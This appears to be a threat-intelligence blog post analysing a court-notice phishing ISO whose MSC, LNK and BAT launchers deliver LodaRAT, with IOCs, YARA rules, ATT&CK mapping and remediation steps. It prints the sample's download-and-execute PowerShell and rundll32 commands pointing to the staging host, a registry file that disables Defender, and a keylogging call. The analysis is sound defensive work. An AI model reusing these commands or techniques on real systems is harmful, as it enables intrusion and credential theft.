# Dissecting a "Court ADR" ISO Lure: GrimResource, LOLBIN Downloaders, and a LodaRAT Payload

**TL;DR:** A phishing email delivers an ISO disguised as a legal "Alternative Dispute Resolution" court notice. Opening the ISO offers three redundant execution paths (a weaponized `.msc` file using the GrimResource technique, a spoofed `.lnk` shortcut, and an obfuscated `.bat` script) that all lead back to the same typosquatted staging domain, `us.wind0ws.net`, and ultimately drop three renamed clones of an AutoIt-compiled payload. Further analysis of the decompiled AutoIt source — keylogging via `GetAsyncKeyState`, multi-browser credential theft, BASS-based audio/webcam surveillance, a UAC-bypass component, and a custom TCP C2 protocol to `my.thispc.net:4000` — corroborates identification as **LodaRAT** (aka Nymeria). This post walks through the full chain from lure to payload, with IOCs, YARA rules, and detection notes at the end.

---

## 1. The Lure

The infection begins with a phishing email prompting the recipient to download a "Court Order" notice — `Court_Order_for_ADR.iso`.

- **SHA-256:** `8d4d6808d9b88683149a8c6e2b33e4ed62587dfcfd32e6a6c60b087206141c88`
- **Format:** UDF/ISO9660, built with the Microsoft IMAPI2 engine
- **VirusTotal popular threat label:** `trojan.boxter/genbadur`

Mounting the ISO presents the victim with what looks like a folder of legal documents. The volume includes on-screen text explicitly instructing the victim to disable Windows Security / Microsoft Defender if a file "does not open" — a social-engineering step that primes the victim to defeat their own protection before execution even begins.

> 🖼️ **[Screenshot 1: ISO contents / mounted volume as seen by the victim]**

Three files are bundled together inside the ISO, giving the attacker redundancy if any single file type is blocked by policy:

| File | Type | Role |
|---|---|---|
| `Court_Order_for_ADR.msc` | MMC console (GrimResource) | Primary launcher |
| `Supporting-lawsuit-documents.lnk` | Shortcut | Chains to the BAT file |
| `Original_Complaint.bat` | Batch script | LOLBIN downloader |

In the observed infection, the victim double-clicked the `.lnk` file, which invoked `cmd.exe /c Original_Complaint.bat` — triggering the batch-file download path described below. The `.msc` file provides an independent, parallel path to the same outcome if the LNK/BAT path is blocked.

---

## 2. Launcher 1 — The MSC File (GrimResource)

`Court_Order_for_ADR.msc` abuses the **GrimResource** technique: a Microsoft Management Console (`.msc`) file crafted so that opening it silently executes attacker code instead of showing a normal admin console.

- The `<BinaryStorage>` XML block is stuffed with bitmap image data, referenced from the taskpad UI via `BinaryRefIndex="5"` / `"6"`. This serves two purposes: it renders a convincing fake "secure legal portal" interface instead of a bare MMC window, and its size pads the file to dilute static-scanner signatures.
- The `<StringTable>` carries the "Court ADR Secure Case Portal" lure text, including the Defender-disable instruction.
- The embedded `<ConsoleTaskpad>` invokes, hidden:

  ```
  %SYSTEMROOT%\System32\cmd.exe /c POWERSHELL -e BYPASS -nop -W HIDDEN -EC [BASE64]
  ```

  which decodes to:

  ```powershell
  Invoke-RestMethod -Uri "https://us.wind0ws.net/SystemSettings.exe" -OutFile $env:APPDATA\Taskmgr.exe
  Invoke-Item $env:APPDATA\Taskmgr.exe
  ```

> 🖼️ **[Screenshot 2: MSC file opened in a text/XML editor showing the BinaryStorage / CommandLine structure]**

---

## 3. Launcher 2 — The LNK File

`Supporting-lawsuit-documents.lnk` is disguised with the standard Windows folder icon (`shell32.dll`, icon index 325) and named to look like a folder of supporting legal documents.

| Property | Value |
|---|---|
| Target | `C:\Windows\System32\cmd.exe` |
| Arguments | `/C [path to Original_Complaint.bat]` |
| Icon | `%SystemRoot%\system32\shell32.dll`, index 325 |

Double-clicking it silently launches the bundled batch file — the observed initial trigger in this incident.

> 🖼️ **[Screenshot 3: LNK file properties dialog showing the spoofed icon and target command]**

---

## 4. Launcher 3 — The BAT File (LOLBIN Downloader)

`Original_Complaint.bat` chains several living-off-the-land techniques to fetch the payload without dropping a fetcher binary of its own:

```bat
Rundll32 inetcpl.cpl , ClearMyTracksByProcess 8 &&
Timeout /T 7 /NObreak &&
Taskkill.exe /F /IM Rundll32.exe &&
rundll32.exe "%ProgramFiles%\Windows Photo Viewer\photoVIEWER.dll" , ImageView_Fullscreen https://us.wind0ws.net/SystemSettings.exe &
del %Temp%\wcUPX6UKGn6.bat
```

| Step | Command | Purpose |
|---|---|---|
| 1 | `Rundll32 inetcpl.cpl` | Opens the Internet Control Panel |
| 2 | `ClearMyTracksByProcess 8` | Clears cached browser data / resets zone state to reduce SmartScreen friction |
| 3 | `Timeout /T 7` | Self-timing delay |
| 4 | `Taskkill /F /IM Rundll32.exe` | Force-kills rundll32 after the download step, keeping it from lingering visibly |
| 5 | `rundll32 photoVIEWER.dll , ImageView_Fullscreen <url>` | Abuses a signed Windows DLL export to silently fetch the payload into the IE/Edge cache |
| 6 | `del ...wcUPX6UKGn6.bat` | Self-delete for anti-forensics |

The download step forces Windows to fetch the binary into `%LocalAppData%\Microsoft\Windows\INetCache\IE\<random>\`, from which a `FOR /F` loop finds and executes it via `conhost.exe`.

> 🖼️ **[Screenshot 4: Sandbox process tree showing rundll32 → photoViewer.dll → conhost.exe execution chain]**

---

## 5. Payload Delivery and Clone Correlation

Once triggered, the MSC and BAT/LNK paths independently retrieve payloads from `us.wind0ws.net`, ultimately dropping three files: `SystemSettings.exe`, `Taskmgr.exe`, and `msedge.exe`. Static section analysis (`objdump`) confirms these are **compiled codebase clones**:

| Section | Size (identical across all 3) |
|---|---|
| `.text` | `0008be74` |
| `.rdata` | `0002c76a` |
| `.data` | `00006200` |

The only variation is the `.rsrc` section (~531 KB / ~727 KB / ~640 KB), where the attacker swapped icon sets and version metadata per file — enough to shift each file's SHA-256 hash and evade hash-based blocklists while retaining identical functionality.

**Confirmed hashes:**

| File | SHA-256 | MD5 |
|---|---|---|
| SystemSettings.exe | `638c368b2b4874314513ac4abd902a6380b9380aeed22362e48d84f4ca03f958` | `d2b6da9ab49200589d337f0eaec4587e` |
| Taskmgr.exe | `2aee16ac89718f66778417d6e74460cc620c3c530f0e1aad33d7ad8498010dcf` | `78dfe910a693468a585e87eb20fdeadc` |

Each binary unpacks to an AutoIt script (`script.au3`) plus an embedded registry file (`01.reg`), decompiled and analyzed below.

> 🖼️ **[Screenshot 5: Side-by-side objdump/PE section headers of the three payloads]**

---

## 6. Inside the Payload: Loader and Installation Behavior

On execution, the AutoIt loader follows a consistent install routine before reaching out to its C2:

1. **Single-instance check** — checks for an existing marker window (an internal identifier string) and exits if already running, avoiding duplicate infections.
2. **Defender tampering** — drops the embedded `01.reg` via `FileInstall` to `%Temp%\KVZMPP.reg` and silently imports it:
   ```
   [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
   "DisableAntiSpyware"=dword:00000001

   [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]
   "DisableBehaviorMonitoring"=dword:00000001
   "DisableOnAccessProtection"=dword:00000001
   "DisableScanOnRealtimeEnable"=dword:00000001
   ```
   This is a direct policy-level Defender disable — a meaningful escalation beyond the social-engineered "please disable Defender yourself" instruction in the lure.
3. **Self-installation** — copies itself to `%AppData%\Windata\Settings.exe`.
4. **Persistence (three independent methods, tracked under a registry value named `OVDNMH` in the observed sample):**
   - Registry Run key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OVDNMH` → `%AppData%\Windata\Settings.exe`
   - Startup folder shortcut: `%Startup%\OVDNMH.lnk`
   - Scheduled task `OVDNMH.exe`, observed triggering roughly every minute
5. **Anti-forensic self-deletion** — the original dropped executable removes itself from disk shortly after installing to `Windata\`. This is implemented via a small runtime-generated VBScript:
   - `WScript.Sleep 5000` — a mandatory 5-second delay, since Windows won't allow a running executable to delete itself; the parent process exits first and lets the timer count down in the background.
   - `CreateObject("Scripting.FileSystemObject")` — a trusted Windows automation object used to delete files.
   - `.DeleteFile` is then called against the original installer path, shredding the on-disk artifact and shifting the malware into a state where only the relocated `Windata\Settings.exe` copy remains — reducing what's left for post-incident disk forensics.
6. **Anti-analysis checks** — the script checks for the presence of process/file names associated with its own components (`Settings.exe`, `svwin1.exe`, `svwin2.exe`), consistent with basic environment/re-execution detection rather than full sandbox evasion.

> 🖼️ **[Screenshot 6: Registry Editor showing the Defender policy keys post-import, if captured in a lab environment]**

---

## 7. Surveillance and Data-Theft Capabilities

Once installed, the payload's capability set is extensive:

**Keylogging** — polls key state directly via the Windows API:
```
DllCall("user32.dll", "short", "GetAsyncKeyState", "int", "0x" & $hexKeyCode)
```
Captured input is written to `%Temp%\Klog.txt`.

**Browser credential theft** — targets profile directories for Chrome, Edge, Brave, and Firefox:
```
...\AppData\Local\Google\Chrome\User Data\Default\
...\AppData\Local\Microsoft\Edge\User Data\Default\
...\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\
...\AppData\Roaming\Mozilla\Firefox\Profiles\
```
Chromium-based browser databases are copied locally (as `dbsq.db`) and parsed with a bundled SQLite engine (`sq8.dll`), decrypting saved credentials via Windows DPAPI / AES-GCM and writing results to `%Temp%\PassW8.txt`. Firefox credentials, session cookies, and client certificate material (`logins.json`, `cert8.db`/`cert9.db`, `key3.db`/`key4.db`) are read and decrypted via `nss3.dll`. FileZilla's `recentservers.xml` and saved Wi-Fi profiles/passwords (via `netsh wlan show profiles`) are also targeted.

**Audio and webcam surveillance** — uses the BASS audio library (`bass.dll`, `baenc.dll`) to record ambient/microphone audio to `%Temp%\Ransound.wma` / `SouSen.mp3`, and a bundled DLL (`es.dll`) for webcam capture, saved as `%Temp%\666xv.jpg`.

**Screen and clipboard capture** — periodic or click-triggered screenshots (configurable quality) and clipboard content collection.

**Privilege escalation** — a dropped component named `UxAxC.exe` attempts a UAC-bypass technique to obtain elevated execution without triggering a consent prompt. Notes on this sample also reference an Image File Execution Options (IFEO) debugger hijack against `*.exe` under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`, which — if confirmed — would allow the malware to intercept execution of arbitrary executables system-wide; this warrants further validation before being treated as confirmed behavior.

**Remote access / backdoor** — full remote-control command set, including remote shell execution, process listing/kill, window manipulation, mouse/keyboard simulation, file upload/download, registry read/write/delete, and system power control (shutdown/restart/logoff). The sample also contains support for deploying an Ngrok tunnel (`nx.exe`) for persistent external reachability, and command handling consistent with enabling RDP.

> ⚠️ **Unconfirmed / needs validation:** Some indicators (a Port 445 connection loop, references to SMB) suggest possible local-network propagation capability, but this is not consistently supported across all analysis passes on this sample — one summary explicitly assessed spread as "limited, not self-propagating." Treat SMB worm behavior as **unconfirmed** pending further dynamic analysis rather than a settled finding.

---

## 8. Command and Control

The payload connects outbound to:

```
my.thispc.net : 4000  (TCP, custom protocol)
```

On connection, it transmits victim reconnaissance data — machine name, username, OS version/architecture, antivirus status, and MAC address — before entering a command-wait loop. Observed command/response markers in the custom TCP protocol include string identifiers such as `"CLGetres"`, `"Ijs_ox"` / `"Ikey_ox"` / `"Icert_ox"` (Firefox JSON/key/certificate exfil targets), and a handshake string `"HAWalikoum"`.

A secondary, low-priority network behavior worth noting for completeness: the sample also contains logic to stream audio from `live.mp3quran[.]net:9976` via the deprecated Microsoft Media Server (MMS) protocol in Windows Media Player. This "QURAN" command is a documented feature of LodaRAT in public reporting and functions as decoy/benign-looking traffic rather than a core espionage capability — see [SOC Prime's writeup on Loda's feature additions](https://socprime.com/news/loda-trojan-receives-new-features/) for background on this and other documented Loda command additions (that piece also covers an earlier Loda delivery chain via OOXML/RTF and CVE-2017-11882, which differs from the ISO/GrimResource chain documented in this post).

> 🖼️ **[Screenshot 7: Sandbox network capture showing the C2 handshake to my.thispc.net:4000]**

---

## 9. Payload Classification

Taken together — an AutoIt-compiled loader, `GetAsyncKeyState`-based keylogging, multi-browser DPAPI/AES-GCM credential theft, BASS-based audio/webcam surveillance, a UAC-bypass component, three-vector persistence, VBScript self-deletion, and a custom TCP C2 protocol to `my.thispc.net:4000` with the documented "QURAN" decoy-streaming command — this sample is assessed as **LodaRAT** (also tracked as **Nymeria**), a long-running AutoIt-based RAT associated with credential theft and surveillance. VirusTotal's automated classification separately labels the delivery ISO as `trojan.boxter/genbadur`.

---

## 10. Indicators of Compromise

**Network**

```
us.wind0ws.net              (payload staging — typosquat of "windows")
my.thispc.net:4000          (C2 server)
checkip.amazonaws.com       (IP/geo lookup — commonly abused by commodity malware, not inherently malicious)
live.mp3quran.net:9976      (MMS decoy stream — documented Loda feature)
*.ngrok.io                  (tunneling infrastructure)
```

**Files**

```
Court_Order_for_ADR.iso
  SHA-256: 8d4d6808d9b88683149a8c6e2b33e4ed62587dfcfd32e6a6c60b087206141c88
  MD5:     350f46d727589bb2f65c8d6777b1c948
  SHA-1:   10ae867102941b33e4c28b97611394cc13998f00

SystemSettings.exe
  SHA-256: 638c368b2b4874314513ac4abd902a6380b9380aeed22362e48d84f4ca03f958
  MD5:     d2b6da9ab49200589d337f0eaec4587e

Taskmgr.exe
  SHA-256: 2aee16ac89718f66778417d6e74460cc620c3c530f0e1aad33d7ad8498010dcf
  MD5:     78dfe910a693468a585e87eb20fdeadc

Court_Order_for_ADR.msc
Original_Complaint.bat
Supporting-lawsuit-documents.lnk
Settings.exe                          (%AppData%\Windata\)
KVZMPP.reg                            (%Temp%, dropped from embedded 01.reg)
wcUPX6UKGn6.bat                       (%Temp%, self-deleting)
bass.dll, baenc.dll                   (%Temp%, audio)
es.dll                                (%Temp%, webcam)
sq8.dll                               (%Temp%, SQLite parsing)
nx.exe                                (%Temp%, Ngrok tunnel)
UxAxC.exe                             (%Temp%, UAC bypass component)
OVDNMH.lnk                            (%Startup%)
Klog.txt, PassW8.txt, dbsq.db         (%Temp%, keylog/credential output)
666xv.jpg, Ransound.wma, SouSen.mp3   (%Temp%, webcam/audio output)
```

**Registry**

```
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender!DisableAntiSpyware = 1
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection!DisableBehaviorMonitoring = 1
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection!DisableOnAccessProtection = 1
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection!DisableScanOnRealtimeEnable = 1
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OVDNMH = %AppData%\Windata\Settings.exe
HKCU\Software\Win32                    (configuration / stolen-data staging key)
```

**Scheduled Task**

```
Name: OVDNMH.exe
Trigger: ~every 1 minute
Action: %AppData%\Windata\Settings.exe
```

---

## 11. YARA Rules

```yara
rule LodaRAT_AutoIt_Payload {
    meta:
        description = "Detects the AutoIt-compiled LodaRAT payload observed in this campaign"
        reference = "Court_Order_for_ADR.iso campaign"
    strings:
        $a1 = "OVDNMH" wide ascii
        $a2 = "KVZMPP.reg" wide ascii
        $a3 = "my.thispc.net" wide ascii
        $a4 = "HKCU\\Software\\Win32" wide ascii
        $a5 = "DisableAntiSpyware" wide ascii
        $a6 = "Settings.exe" wide ascii
        $a7 = "live.mp3quran.net" wide ascii
    condition:
        (uint16(0) == 0x5A4D) and (4 of ($a*))
}

rule LodaRAT_Phishing_ISO {
    meta:
        description = "Detects components of the Court_Order_for_ADR.iso delivery chain"
    strings:
        $s1 = "Court_Order_for_ADR" wide
        $s2 = "Original_Complaint.bat" wide
        $s3 = "Supporting-lawsuit-documents.lnk" wide
        $s4 = "wind0ws.net" wide
        $s5 = "SystemSettings.exe" wide
        $s6 = "ClearMyTracksByProcess" wide
        $s7 = "photoVIEWER.dll" wide
    condition:
        2 of ($s*)
}

rule LodaRAT_Defender_Disable_Reg {
    meta:
        description = "Detects the embedded Defender-disable registry payload"
    strings:
        $s1 = "DisableAntiSpyware" wide
        $s2 = "DisableBehaviorMonitoring" wide
        $s3 = "DisableOnAccessProtection" wide
        $s4 = "DisableScanOnRealtimeEnable" wide
    condition:
        all of ($s*)
}
```

---

## 12. Detection Notes / ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Phishing | T1566.001 |
| Execution | User Execution | T1204.002 |
| Execution | Command and Scripting Interpreter (PowerShell / Windows Command Shell) | T1059.001, T1059.003 |
| Persistence | Registry Run Keys / Startup Folder | T1547.001 |
| Persistence | Scheduled Task | T1053.005 |
| Privilege Escalation | Abuse Elevation Control Mechanism (UAC bypass) | T1548.002 |
| Defense Evasion | Impair Defenses (Defender disable) | T1562.001 |
| Defense Evasion | Signed Binary Proxy Execution (rundll32 / photoViewer.dll, MMC / GrimResource) | T1218 |
| Defense Evasion | Obfuscated Files or Information | T1027 |
| Defense Evasion | Masquerading | T1036 |
| Defense Evasion | Indicator Removal (self-deletion) | T1070.004 |
| Credential Access | Credentials from Web Browsers | T1555.003 |
| Credential Access | Unsecured Credentials (config/session files) | T1552.001 |
| Discovery | System Information / Process Discovery | T1082, T1057 |
| Collection | Keylogging | T1056.001 |
| Collection | Screen Capture / Audio Capture / Clipboard | T1113, T1123, T1115 |
| Command & Control | Application Layer Protocol (custom TCP) | T1071 |
| Command & Control | Protocol Tunneling (Ngrok) | T1572 |
| Command & Control | Ingress Tool Transfer | T1105 |
| Exfiltration | Exfiltration Over C2 Channel | T1041 |

**Suggested detections:**
- Alert on `rundll32.exe` invoking `ImageView_Fullscreen` with a URL-formatted argument.
- Alert on `.msc` files launched from removable/mounted media containing `<BinaryStorage>` blocks above a size threshold.
- Alert on `.reg` file imports immediately following execution of a newly-dropped, unsigned executable in `%AppData%` or `%Temp%`.
- Block `us.wind0ws.net` and `my.thispc.net`; monitor for zero-for-"o" typosquats of "windows" more broadly.
- Hunt for the `OVDNMH` registry value/scheduled task name and `Windata\Settings.exe` path.
- Flag process trees where three or more compiled binaries share identical `.text`/`.rdata`/`.data` section sizes but differ only in `.rsrc`.
- Deploy the YARA rules above across endpoint and email-gateway scanning.

---

## 13. Remediation (If You've Found This on a Live Host)

1. **Isolate** the host from the network immediately to cut C2 access.
2. **Kill** the running malicious processes (`Settings.exe`, `Taskmgr.exe`, `SystemSettings.exe`, and any `svwin1.exe`/`svwin2.exe`/`Pl2.exe`/`nx.exe` if present).
3. **Remove persistence**: delete the `OVDNMH` Run key and scheduled task, and remove the Startup-folder shortcut.
4. **Restore Windows Defender**: remove the Defender policy keys under `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender`, then re-enable real-time protection.
5. **Run a full AV/EDR scan** after remediation, not before — the sample actively disables Defender's real-time layer.
6. **Rotate credentials** for any accounts used on the host (browser-saved passwords, Wi-Fi, FileZilla, email), and review for unauthorized account creation or RDP enablement.

---

*Sample submitted to [VirusTotal / MalwareBazaar — add link once submitted]. Indicators also available in [STIX/CSV format — add link if publishing one].*

